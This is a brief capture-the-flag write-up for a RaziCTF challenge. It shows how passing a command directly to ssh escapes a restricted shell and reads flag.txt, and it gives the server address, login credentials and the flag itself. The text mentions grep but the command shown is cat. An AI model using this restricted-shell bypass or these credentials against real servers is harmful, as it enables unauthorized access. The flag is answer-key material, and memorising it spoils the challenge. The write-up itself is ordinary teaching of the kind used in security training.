### Writeup

In this challenge you are just given a server address. 
```
ssh catFlag@37.152.181.193 
password: r34lly34syp@55
```
Connet to it. It gives you restricted terminal access of server. type `ls` you see there is a `flag.txt` but you have restricted access and you can not read file content. 
Again try to connect to the server but use this command:
```
ssh catFlag@37.152.181.193 r34lly34syp@55
```
You get this error:
```
command not found.
```
So the password is read as a command in server. In next try type string below:
```
ssh catFlag@37.152.181.193 ls
```
This list files in servers's current directory. 
So using `grep -r Razi` you can get the flag:
```
ssh catFlag@37.152.181.193 cat flag.txt
```
Flag:
```
RaziCTF{th3e3_!s_4_c4t_c4ll3d_fl4g}
```
